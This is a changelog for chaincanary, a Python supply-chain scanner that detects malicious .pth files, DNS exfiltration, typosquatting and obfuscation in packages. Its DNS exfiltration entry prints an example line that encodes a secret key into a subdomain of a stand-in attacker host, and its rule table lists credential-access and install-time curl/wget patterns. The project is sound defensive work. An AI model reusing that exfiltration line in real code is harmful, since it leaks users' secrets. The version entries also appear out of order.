# Changelog

All notable changes to this project will be documented in this file.
Format: [Keep a Changelog](https://keepachangelog.com/en/1.0.0/)

---

## [0.2.0] — 2026-03-27

### Added

**SARIF v2.1.0 output** (`chaincanary/sarif.py` — new module)
- `--sarif-output` flag on both `check` and `audit` commands
- Generates SARIF v2.1.0 JSON for GitHub Code Scanning / Security tab
- Package URL (purl) format for artifact URIs: `pkg:pypi/{name}@{version}`
- SHA-256 partial fingerprints for cross-run deduplication
- Severity mapping: CRITICAL/HIGH → error, MEDIUM → warning, LOW/INFO → note
- Rule deduplication: same `rule_id` across multiple findings → one rule entry
- Evidence truncation at 1024 chars to prevent SARIF bloat
- Control character sanitization (null bytes, C0 chars stripped from evidence)
- Robust `reports_to_sarif()` handles malformed audit dicts (None entries, missing keys, non-dict findings)
- GitHub Action updated with `sarif-output` input for automatic SARIF upload

**Offline mode** (`--offline` flag on `check` and `audit`)
- `check --offline --local <path.whl>` — scan a local wheel with zero network calls
- `audit --offline --wheel-dir <dir>` — scan all wheels in a directory against a lockfile
- Engine skips version diff and safe version lookup in offline mode
- Wheel filename parsing supports PEP 427 naming with hyphenated package names
- Package name normalization (PEP 503): hyphens ↔ underscores matched correctly
- Unpinned versions auto-resolved from available wheels in `--wheel-dir`
- Typosquatting check still runs in offline mode (no network needed)
- `OFFLINE_NO_WHEEL` finding emitted when no matching wheel found
- Multiple platform wheels for same package/version produce single result

**Remote hash feed** (`chaincanary/hashfeed.py` — new module)
- Pull `known_malicious_hashes` from remote JSON feed (GitHub raw) instead of hardcoding
- Auto-update on first run with configurable refresh interval
- `chaincanary update` command to manually refresh hash database

**Dependency confusion detection**
- Flag packages with same name as internal packages
- Useful in companies with private PyPI mirrors

**AST deep scan** (`chaincanary/analyzer/ast_deep.py` — new module)
- Detects obfuscation patterns regex misses (e.g., `getattr(obj, "g"+"et")`)
- String concatenation in getattr/import calls
- Deep analysis of `__init__.py` for hidden malicious patterns

**PEP 740 attestation verification** (`chaincanary/attestation.py` — new module)
- Queries PyPI Integrity API for Sigstore digital attestations
- Extracts publisher kind, repository, workflow ref from attestation metadata
- `--check-attestation/--no-check-attestation` flag on `check`, `audit`, and `install`
- INFO-only findings (no score impact): `ATTESTATION_VERIFIED` / `NO_ATTESTATION`
- Attestation badge displayed in verdict panel (signed vs unsigned)
- Input validation for package names, versions, filenames
- Response cap (1 MB) to prevent memory exhaustion
- Automatically disabled in offline mode

**CLI enhancements**
- `--timeout` flag — per-package download timeout (default 30s)
- `--skip` patterns — ignore known-safe packages (e.g., `--skip torch,tensorflow`)
- Rich progress bar for `audit` command (no longer silent)

### Fixed

**action.yml security hardening**
- Replaced inline `${{ inputs.* }}` interpolation with environment variables to prevent shell injection
- Simplified extra-packages scanning flow

**CLI output separation**
- Diagnostics (progress, warnings) now go to stderr; structured output (JSON/SARIF) goes to stdout
- Prevents mixing Rich terminal formatting with machine-readable output

**Type safety fixes**
- Fixed mypy type errors across 5 modules (ast_deep, engine, cli, hashfeed, downloader)
- Fixed ruff E501 line-length violations in engine.py

### Tests

- 375 tests total (was 69 in v0.1.5) — all passing
- `tests/test_sarif.py`: 78 tests covering SARIF schema compliance
- `tests/test_sarif_edge_cases.py`: 47 edge-case tests
- `tests/test_offline_edge_cases.py`: 18 offline mode edge-case tests
- `tests/test_ast_deep.py`: AST deep scan detection tests
- `tests/test_dep_confusion.py`: dependency confusion tests
- `tests/test_hashfeed.py`: remote hash feed tests
- `tests/test_timeout.py`, `tests/test_skip.py`: new flag tests
- `tests/test_attestation.py`: PEP 740 attestation verification tests

---

## [0.1.6] — 2026-03-26 (post-0.1.0 hardening)

### Fixed

**Scoring system overhaul** (`chaincanary/models.py`)
- **BUG**: `1×CRITICAL` produced `score=4.0 → LOW_RISK`. Completely wrong — a single
  CRITICAL finding (e.g., phone-home `.pth`) should never be LOW_RISK.
- Fix: severity-floor override rules added on top of numeric threshold:
  - `1×CRITICAL` → verdict floor **HIGH_RISK**
  - `2+ CRITICAL` → verdict floor **MALICIOUS**
  - `3+ HIGH` → verdict floor **HIGH_RISK**
- **BUG**: `20×LOW` accumulated to `6.0 → HIGH_RISK` (noise inflation).
- Fix: LOW findings capped at 8 contributors to score. `20×LOW = 2.4 → LOW_RISK`.

**DNS exfiltration detection** (`chaincanary/analyzer/static.py`)
- New rule: `DNS_EXFIL` (HIGH severity)
- Detects `socket.getaddrinfo()` and `socket.gethostbyname()` with dynamic hostnames in `__init__.py`
- DNS exfil encodes stolen secrets (env vars, tokens) as subdomains:
  `socket.getaddrinfo(base64(SECRET_KEY) + ".c2.attacker.com", 80)`
- DNS traffic bypasses most firewalls — this was a real blind spot.
- Non-init files with socket (e.g., `server.py`) are **not** flagged → no false positives.

**`sys.modules` bypass detection** (`chaincanary/analyzer/static.py`)
- New rule: `SYS_MODULES_ACCESS` (MEDIUM severity)
- Attackers use `sys.modules['requests'].get(...)` to call network functions
  without triggering `import requests` pattern matching.
- Now detected in `__init__.py`.

**`safe_version` recommendation validation** (`chaincanary/engine.py`)
- **BUG**: Previous version was blindly recommended as rollback without scanning it.
  If `1.82.6` was also compromised, we'd recommend a malicious version.
- Fix: `_find_validated_safe_version()` runs a quick static scan on up to 3 candidates
  and only recommends versions that pass as SAFE or LOW_RISK.

**`alias pip` removed from README**
- Using `alias pip="chaincanary install"` breaks `-e .`, `-r`, and other pip flags.
- Replaced with a clear recommended workflow section.

**Comparison table accuracy** (`README.md`)
- `Trivy` correctly described as SBOM+CVE scanner (does file-level scanning, not behavioral .pth analysis)
- `pip-audit` correctly described (does CVE + dependency confusion, not behavioral)
- `socket.dev` added to table
- Added clarifying note: use chaincanary *alongside* pip-audit/Safety, not instead of

**Workers rate-limit cap** (`chaincanary/cli/audit_cmd.py`)
- `--workers` capped at 16 internally to avoid PyPI 429 rate-limiting
- Warning printed when user requests more than 16

### Added

**Typosquatting detection** (`chaincanary/safety_checks.py` — new module)
- `check_typosquatting()` using Levenshtein edit distance + SequenceMatcher similarity
- Database of 100+ most-downloaded PyPI packages
- Threshold: edit distance ≤ 2 AND similarity ≥ 0.75
- HIGH severity for distance=1 (e.g., `reqeusts`→`requests`)
- MEDIUM severity for distance=2 (e.g., `numpyy`→`numpy`)
- Catches visual substitution attacks: `fIask` (capital I) → `flask`
- Runs as Step 0 in `AnalysisEngine.analyze()` — no download required

**Git dependency flagging** (`chaincanary/lockfile.py`)
- `PackageSpec` gains `is_git_dep: bool` and `git_url: Optional[str]`
- `parse_requirements_txt()` now parses `git+https://`, `-e git+`, `git://` lines
- Git dependencies are marked HIGH_RISK in `audit` output:
  they bypass PyPI review, code signing, and reproducible builds

### Tests

- 69 tests total (was 33) — all passing
- `tests/test_review_fixes.py`: 36 new tests covering all above fixes
- Scoring: 12 test cases for all verdict combinations
- DNS exfil: 7 test cases including false-positive checks
- Typosquatting: 9 test cases including visual substitution attacks
- Git deps: 4 test cases
- Regression: 4 tests ensuring prior detections still work

---

## [0.1.1] — 2026-03-26

### 🔧 Fix: PyPI trusted publishing configuration

- Switched from manual twine upload to GitHub Actions OIDC trusted publishing
- No functional changes to detection engine

---

## [0.1.0] — 2026-03-26

### 🔄 Renamed: pipguard → chaincanary

The project has been renamed from `pipguard` to `chaincanary`.

**Why:** The name `chaincanary` better captures the tool's purpose — like the
canary in a coal mine, it's the first signal that something in your supply chain
has gone wrong. It's also not tied to `pip`, leaving room to expand to other
ecosystems (npm, cargo, go modules) in the future.

The old PyPI name `pipguard` will publish a stub package pointing to `chaincanary`.

---

## [0.1.0] — 2026-03-25

### 🚀 Initial Release

**The short story:** We built chaincanary the day LiteLLM 1.82.7 hit the news.
The attack hid a phone-home beacon inside a `.pth` file — a mechanism that
executes on every Python interpreter startup. chaincanary was designed to catch
exactly this.

### Added

**Core detection engine**
- Static analysis of Python wheels (no sandbox, no Docker required)
- `.pth` file semantic classifier — distinguishes EMPTY / PATH_ONLY / SAFE_CODE / DANGEROUS
  - Empty `.pth` (pytest-cov style): silent ✓
  - `setuptools` distutils shim: LOW warning only ✓
  - LiteLLM 1.82.7 attack pattern: CRITICAL → MALICIOUS ✓
- AST deep analysis: exec/eval obfuscation, network calls in install hooks
- Delayed-trigger detection: network calls in `__init__.py` (runs on every import)
- Zip safety: path traversal + zip bomb detection
- Known malicious hash database (SHA256)

**Version diff**
- `chaincanary diff <pkg> <v1> <v2>` — shows exactly what changed between versions
- Flags new `.pth` files, new network imports, behavioral changes

**Lockfile audit**
- `chaincanary audit requirements.txt` — scans all pinned packages in parallel
- Supports: requirements.txt, pyproject.toml, Pipfile.lock
- `--fail-on MALICIOUS|HIGH_RISK` for CI integration

**GitHub Action**
- Drop-in action: `uses: allenenli/chaincanary@v0.1.0`
- Audits your requirements file on every push/PR
- Fails the build if malicious packages detected

**CLI**
- `chaincanary check <package> <version>` — single package scan
- `chaincanary audit [lockfile]` — batch scan
- `chaincanary diff <pkg> <v1> <v2>` — version comparison
- `chaincanary install <package>` — safe install wrapper
- JSON output mode (`--json-output`) for pipeline integration

### Detection rules (v0.1.0)

| Rule | Severity | What it catches |
|------|----------|-----------------|
| PTH_FILE_INSTALL | CRITICAL | `.pth` with external data flow |
| PTH_NETWORK_BEACON | CRITICAL | phone-home on every Python startup |
| PTH_SUBPROCESS | CRITICAL | shell command on every Python startup |
| NETWORK_IN_SETUP | HIGH | network call during `pip install` |
| SUBPROCESS_IN_SETUP | HIGH | shell command during `pip install` |
| OBFUSCATED_CODE | HIGH | base64+exec, eval obfuscation |
| SENSITIVE_PATH_WRITE | HIGH | SSH keys, AWS creds access |
| CURL_WGET_IN_SETUP | HIGH | curl/wget during install |
| INIT_NETWORK_CALL | MEDIUM | network call on every import |
| EXEC_IN_SETUP | MEDIUM | exec() in install hooks |
| SITECUSTOMIZE_MODIFY | MEDIUM | system-wide startup hook |
| KNOWN_MALICIOUS_HASH | CRITICAL | SHA256 hash database match |
| WHEEL_PATH_TRAVERSAL | CRITICAL | directory escape in wheel |
| WHEEL_ZIP_BOMB | HIGH | excessive file count |

---

## [0.1.5] - 2026-03-26

### Changed
- README: rewrite comparison section — explicit "Why not socket.dev?" table
- README: promote .pth semantic classifier to top-level section with clearer framing
- README: hero tagline highlights "only tool that detected LiteLLM 1.82.7 as MALICIOUS"
